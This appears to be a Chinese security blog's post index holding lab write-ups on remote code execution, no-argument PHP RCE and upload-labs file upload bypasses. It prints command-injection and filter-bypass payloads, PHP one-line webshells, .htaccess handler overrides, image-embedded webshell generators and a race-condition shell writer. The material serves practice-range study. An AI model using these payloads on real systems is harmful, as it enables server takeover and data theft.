[{"content":"hello world 666\n111\n","date":"2025-07-07T18:48:57+08:00","permalink":"https://0d000721999.github.io/p/test/","title":"Test"},{"content":"RCE 远程代码执行：Remote Code Execute\n远程命令执行：Remote Command Execute\nphp RCE函数 命令拼接符号 windows linux pikachu靶场练习 ping 直接在ip后\u0026amp;加命令\neval 用system(\u0026lsquo;ipconfig\u0026rsquo;)或者phpinfo()测试\nDVWA的RCE low 跟pikachu一样直接加\u0026amp;\nmedium 因为平台是Windows，而靶场过滤的是Linux连接符，所以跟上面一样\nhigh 查看源码管道符|后有空格\n我们不加空格直接拼接\nctfhub练习 eval执行 蚁剑连接，右键打开终端\n然后ls /根目录下就有flag\n命令注入-无过滤 要求输入ip,没有过滤\n直接输入127.0.0.1;ls查看目录下文件\n有一个php文件，cat查看没东西\n直接转base64编码\n1 127.0.0.1;cat xxx.php|base64 然后解码得到flag\n命令注入-过滤cat 改为less就行了\n其他命令\n1 2 3 4 5 6 7 8 cat 由第一行开始显示内容，并将所有内容输出 tac 从最后一行倒序显示内容，并将所有内容输出 more 根据窗口大小，一页一页的现实文件内容 less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符 head 只显示头几行 tail 只显示最后几行 nl 类似于cat -n，显示时输出行号 tailf 类似于tail -f 命令注入-过滤空格 1 使用$IFS$9、%09、\u0026lt;、\u0026gt;、\u0026lt;\u0026gt;、{,}、%20、${IFS}、${IFS}来代替空格 命令注入-过滤命令分隔符 cd跳目录再cat，或者%0a代替目录分隔符/(在url里面输入)\n过滤运算符 其实前面要base64是因为源码被注释了\n所以我们正常cat flag然后查看源码\n综合过滤 flag过滤用f***绕过\ncat改为more\n;用%0a\n然后跟上面一样构造payload到url里面\n1 127.0.0.1%0acd${IFS}f***_is_here${IFS}%0amore${IFS}f***_61177426640.php 防御 1、尽量不要使用命令执行的函数\n2、如果必须使用，需要做白名单处理\n3、用正则表达式对用户输入的内容进行处理\n4、使用WAF\n","date":"2024-10-10T00:00:00Z","image":"https://0d000721999.github.io/p/rce/1.jpg","permalink":"https://0d000721999.github.io/p/rce/","title":"RCE"},{"content":"无参rce 1、getallheaders() getallheaders()返回所有的HTTP头信息，但是要注意的一点是这个函数返回的是一个数组，而eval()要求的参数是一个字符串，所以这里不能直接用，这时我们就要想办法将数组转换为字符串。正好implode()这个函数就能胜任。\nimplode()能够直接将getallheaders()返回的数组转化为字符串。\n可以看到获取到的头信息被当作字符串输出了，且是从最后开始输出(由于php版本不同，输出顺序也可能不同)，那么我们就可以在最后随意添加一个头，插入我们的恶意代码并将后面的内容注释掉。\n1 ?exp=eval(implode(getallheaders())); 2、get_defined_vars() 该函数的作用是获取所有的已定义变量，返回值也是数组。不过这个函数返回的是一个二维数组，所以不能与implode结合起来用。要用var_dump()输出\n用GET传入的参数会被显示在数组中的第一位\n要返回数组的第一个值要用current()函数可以返回数组中的单元且初始指针指向数组的第一个单元。因为GET方式传入的参数存在该二维数组中的第一个一维数组，所以我们可以通过这个函数将其取出来\n1 var_dump(current(get_defined_vars())); 如果我们传值是这样：\n1 ?get=a\u0026amp;shell=phpinfo(); 后面传入的shell=phpinfo();出现在了第一个数组的最后。\nend()函数可以倒序，也就是说我们可以将命令写到后面的参数再调用函数，执行shell命令\n1 ?exp=eval(end(current(get_defined_vars())));\u0026amp;shell=phpinfo(); 3、session_id() session_id()可以用来获取/设置当前会话 ID。 那么可以用这个函数来获取cookie中的phpsessionid了，并且这个值我们是可控的\n文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - （减号)\n解决方法：将参数转化为16进制传进去，之后再用hex2bin()函数转换回来就可以了。\n1 2 ?exp=eval(hex2bin(session_id(session_start()))); 或者?exp=eval(session_start();system(hex2bin(session_id()))); 执行的命令bp写入16进制解析\n1 hex(\u0026#34;phpinfo();\u0026#34;)=706870696e666f28293b 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 getchwd() 函数返回当前工作目录。 scandir() 函数返回指定目录中的文件和目录的数组。 dirname() 函数返回路径中的目录部分。 chdir() 函数改变当前的目录。 readfile() 输出一个文件。 current() 返回数组中的当前单元, 默认取第一个值。 pos() current() 的别名。 next() 函数将内部指针指向数组中的下一个元素，并输出。 end() 将内部指针指向数组中的最后一个元素，并输出。 array_rand() 函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。 array_flip() array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。 array_slice() 函数在数组中根据条件取出一段值，并返回。 array_reverse() 函数返回翻转顺序的数组。 chr() 函数从指定的 ASCII 值返回字符。 hex2bin() — 转换十六进制字符串为二进制字符串。 getenv() 获取一个环境变量的值(在7.1之后可以不给予参数)。 localeconv() 函数返回一包含本地数字及货币格式信息的数组。 ","date":"2024-10-10T00:00:00Z","image":"https://0d000721999.github.io/p/%E6%97%A0%E5%8F%82rce/1.png","permalink":"https://0d000721999.github.io/p/%E6%97%A0%E5%8F%82rce/","title":"无参RCE"},{"content":"文件上传 一句话木马\n1 \u0026lt;?php @eval($_POST[\u0026#39;cmd\u0026#39;]);?\u0026gt; webshell https://github.com/tennc/webshell\n网站控制工具 中国菜刀 中国蚁剑 https://github.com/AntSwordProject/antSword\nweevely https://github.com/epinna/weevely3\n哥斯拉godzila https://github.com/BeichenDream/Godzilla\n冰蝎 behinder https://github.com/rebeyond/Behinder\nweevely(kali) 生成木马\n1 weevely generate cmd weevely.php 连接\n1 weevely ip cmd 就可以执行命令了\nupload-labs靶场练习 pass01 提示不让上传php,猜测是前端验证\n禁用js或者\n按下上传要检测，我们直接删掉onsubmit\n上传直接蚁剑连接\npass02 提示对数据包的MIME检查\nMIME Multipurpose Internet Mail Extensions\n多用途互联网邮件扩展类型\n客户端使用：\n1、GET请求不需要这个字段。\n2、POST请求头，放在Content Type字段用来指定上传的文件类型，方便服务器解析。放在Accept，告诉服务端允许接收的响应类型。比如只能接收json或者其他。\n服务端使用：\n放在响应头里面，Content Type告诉客户端响应的数据类型，方便客户端解析。\n官方解释：https://developermozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Common_types\n所以用bp抓包，在我们上传的一句话木马的content-type中修改成image/jpeg，再放行\n蚁剑连接\npass03 黑名单里面有php\n等价拓展名 首先要修改apache的配置\n加上一行将后面这些拓展识别成php,不知道为什么不行\n换一种方式，把后缀名改为.htaccess，也不行\npass04 .htaccess .htaccess 文件是 Apache 服务器中的一个配置文件，它负责相关目录下的网页配置 。通过 .htaccess 文件，可以实现：网页 301 重定向、自定义404 错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能\n先上传图片（shell.php改后缀为jpg)然后上传.htaccess\n1 2 3 \u0026lt;FilesMatch \u0026#34;shell.jpg\u0026#34;\u0026gt; SetHandler application/x-httpd-php \u0026lt;/FilesMatch\u0026gt; 或者\n1 AddType application/x-httpd-php .jpg 1 SetHandler application/x-httpd-php 把图片匹配为php代码\npass05 查看提示存在readme.php\nphp.ini是php的一个全局配置文件，对整个web服务起作用\n而.user.ini和.htaccess一样是目录的配置文件，.user.ini就是用户自定义的php.ini\n1 2 3 4 5 .user.ini 配置项中有两个配置可以起到一些作用 方法一： auto_prepend_file = \u0026lt;filename\u0026gt; //包含在文件头 方法二： auto_append_file = \u0026lt;filename\u0026gt; //包含在文件尾 上传要改php.ini\n下面那个原来是300秒我们改为10秒\n重启服务后\n上传两个文件\n蚁剑连接的文件要改为readme.php\n也可以用 php. . 点空格点 绕过上传\npass06 大小写过滤不全，用PHP就能上传\npass07 没有过滤空格，抓包后在bp里面把文件后缀加空格放行\n然后就连接上了\npass08 抓包改为.php.\npass09 后缀名未做去::$DATA处理\n1 Windows系统下，如果上传的文件名为`9.php::$DATA`会在服务器上生成一个9.php的文件，其内容和所上传文件内容相同并被解析。 连接时要把::$DATA去掉\npass10 因为会去掉末尾的点和头尾空格\n.php. .（点空格点）\npass11 后缀重写绕过\n.pphphp\npass12 需要php的版本号低于5.3.29，且magic_quotes_gpc为关闭状态（需要自己关闭）\nContent-Disposition 作为对下载文件的一个标识字段\n官方解释：https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Disposition\n文件名截断 截断字符：chr(0) ，类似于C++的\u0026quot;\\0\u0026quot;\n在url编码里面所以要输入%00\n下面那里改成符合条件的后缀名，上面上传路径填写我们的木马然后用%00截断\npass13 现在路径不是url编码，要用16进制，先写个+占位，+的16进制是2b\nhex改为00\npass14 要上传图片马，并且利用文件包含漏洞来实现运行图片中的木马\n1 2 3 4 5 6 7 8 9 10 补充： Png图片文件包括8字节：89 50 4E 47 0D 0A 1A 0A。即为 .PNG Jpg图片文件包括2字节：FF D8。 Gif图片文件包括6字节：47 49 46 38 39|37 61 。即为 GIF89(7)a。 Bmp图片文件包括2字节：42 4D。即为 BM 图片马制作： 在cmd里执行 copy logo.jpg/b+test.php/a test.jpg logo.jpg为任意图片；test.php 插入的木马文件；test.jpg 生成的图片木马 linux里面用 cat logo.jpg shell.php\u0026gt;shell.jpg 上传完成后,在include.php后加上传的文件路径\n1 http://upload-labs/include.php?file=upload/xxx.jpg pass15 这里getimagesize()检查是否为图片文件\n1 2 getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。 主要是针对*.php直接更改文件后缀为图片后缀，上一题创建的图片马仍然可以使用。 pass16 1 2 exif_imagetype()读取一个图像的第一个字节并检查其后缀名。 返回值与getimage()函数返回的索引2相同，但是速度比getimage快 跟14一样\npass17 题目用二次渲染把我们图片马里面的马给清除了\ngif的解决办法\n上传图片然后下载回显图片\n用010editor对比，找到相同的地方（上传前和上传后，两张图片Hex仍然保持不变的位置）并插入木马\n我们直接用现成的图片马，利用文件包含，连接成功\n其他图片格式的办法参考upload-labs之pass 16详细分析 - 先知社区\npng脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;?php $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33); $img = imagecreatetruecolor(32, 32); for ($y = 0; $y \u0026lt; sizeof($p); $y += 3) { $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color); } imagepng($img,\u0026#39;./1.png\u0026#39;); ?\u0026gt; 生成的木马是\n1 \u0026lt;?$_GET[0]($_POST[1]);?\u0026gt; jpg脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 \u0026lt;?php $miniPayload = \u0026#34;\u0026lt;?=phpinfo();?\u0026gt;\u0026#34;; if(!extension_loaded(\u0026#39;gd\u0026#39;) || !function_exists(\u0026#39;imagecreatefromjpeg\u0026#39;)) { die(\u0026#39;php-gd is not installed\u0026#39;); } if(!isset($argv[1])) { die(\u0026#39;php jpg_payload.php \u0026lt;jpg_name.jpg\u0026gt;\u0026#39;); } set_error_handler(\u0026#34;custom_error_handler\u0026#34;); for($pad = 0; $pad \u0026lt; 1024; $pad++) { $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-\u0026gt;readShort() != 0xFFD8) { die(\u0026#39;Incorrect SOI marker\u0026#39;); } while((!$dis-\u0026gt;eof()) \u0026amp;\u0026amp; ($dis-\u0026gt;readByte() == 0xFF)) { $marker = $dis-\u0026gt;readByte(); $size = $dis-\u0026gt;readShort() - 2; $dis-\u0026gt;skip($size); if($marker === 0xDA) { $startPos = $dis-\u0026gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(\u0026#34;\\0\u0026#34;,$nullbytePayloadSize) . substr($outStream, $startPos); checkImage(\u0026#39;_\u0026#39;.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) { while((!$dis-\u0026gt;eof())) { if($dis-\u0026gt;readByte() === 0xFF) { if($dis-\u0026gt;readByte !== 0x00) { break; } } } $stopPos = $dis-\u0026gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(\u0026#34;\\0\u0026#34;,$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); } elseif($correctImage) { $outStream = $outStreamTmp; } else { break; } if(checkImage(\u0026#39;payload_\u0026#39;.$argv[1], $outStream)) { die(\u0026#39;Success!\u0026#39;); } else { break; } } } } unlink(\u0026#39;payload_\u0026#39;.$argv[1]); die(\u0026#39;Something\\\u0026#39;s wrong\u0026#39;); function checkImage($filename, $data, $unlink = FALSE) { global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; } function custom_error_handler($errno, $errstr, $errfile, $errline) { global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match(\u0026#39;/(\\d+) extraneous bytes before marker/\u0026#39;, $errstr, $m)) { if(isset($m[1])) { $extraBytes = (int)$m[1]; } } } class DataInputStream { private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) { $this-\u0026gt;binData = \u0026#39;\u0026#39;; $this-\u0026gt;order = $order; if(!$fromString) { if(!file_exists($filename) || !is_file($filename)) die(\u0026#39;File not exists [\u0026#39;.$filename.\u0026#39;]\u0026#39;); $this-\u0026gt;binData = file_get_contents($filename); } else { $this-\u0026gt;binData = $filename; } $this-\u0026gt;size = strlen($this-\u0026gt;binData); } public function seek() { return ($this-\u0026gt;size - strlen($this-\u0026gt;binData)); } public function skip($skip) { $this-\u0026gt;binData = substr($this-\u0026gt;binData, $skip); } public function readByte() { if($this-\u0026gt;eof()) { die(\u0026#39;End Of File\u0026#39;); } $byte = substr($this-\u0026gt;binData, 0, 1); $this-\u0026gt;binData = substr($this-\u0026gt;binData, 1); return ord($byte); } public function readShort() { if(strlen($this-\u0026gt;binData) \u0026lt; 2) { die(\u0026#39;End Of File\u0026#39;); } $short = substr($this-\u0026gt;binData, 0, 2); $this-\u0026gt;binData = substr($this-\u0026gt;binData, 2); if($this-\u0026gt;order) { $short = (ord($short[1]) \u0026lt;\u0026lt; 8) + ord($short[0]); } else { $short = (ord($short[0]) \u0026lt;\u0026lt; 8) + ord($short[1]); } return $short; } public function eof() { return !$this-\u0026gt;binData||(strlen($this-\u0026gt;binData) === 0); } } ?\u0026gt; 运行脚本命令\n1 jpg_payload.php 1.jpg pass18 代码审计，传入文件与删除有时间差\n思路：\n条件竞争代码\n1 2 3 4 5 6 //18.php \u0026lt;?php fputs(fopen(\u0026#39;shell.php\u0026#39;,\u0026#39;w\u0026#39;),\u0026#39;\u0026lt;?php @eval($_POST[\u0026#34;cmd\u0026#34;]) ?\u0026gt;\u0026#39;); ?\u0026gt; #访问18.php，会在目录下生成一个shell.php 用bp来重复上传\n发到intruder模块，payload设置为空，用于无限访问\n线程设置大点\n开始爆破，同时要手动访问文件\npython访问\n1 2 3 4 5 6 7 import requests url = \u0026#34;http://xxx.xxx.xxx.xxx/upload-labs/upload/18.php\u0026#34; while True: html = requests.get(url) if html.status_code == 200: print(\u0026#34;OK\u0026#34;) break pass19 原题有点问题\n改myupload的源码\n拼接/\n利用apach解析漏洞\n1 xxx.php.* -\u0026gt;xxx.php 然后我们bp不断上传白名单内的后缀\n例如shell.php.7z\n另一种思路，将上一关重复生成代码的木马做成图片马\n反复上传图片马\n这里访问的python脚本为：\n1 2 3 4 5 6 7 import requests url = \u0026#34;http://xxx.xxx.xxx.xx/upload-labs/include.php?file=upload/pass19.png\u0026#34; while True: html = requests.get(url) if ( \u0026#39;Warning\u0026#39; not in str(html.text)): print(\u0026#39;ok\u0026#39;) break 直到生成shell.php为止\npass20 利用函数漏洞\n1 move_uploaded_file()会忽略掉文件末尾的 /.，主要作用是将临时文件移到指定的目标路径，并确保文件在移动中不会被删除或覆盖。 所以我们上传shell.php/.上传后会变成shell.php\npass21 修改content-type 修改POST参数为数组类型，就是save_name[]; 索引[0]为shell.php， 索引[2]为jpg|png|gif。 只要第二个索引不为1，就是不能为save_name[1]; $file[count($file) - 1]就等价于$file[2-1]，值为空绕过\n漏扫工具 https://github.com/almandin/fuxploider\n防御 linux文件权限 ","date":"2024-10-09T00:00:00Z","image":"https://0d000721999.github.io/p/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1.png","permalink":"https://0d000721999.github.io/p/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","title":"文件上传漏洞"}]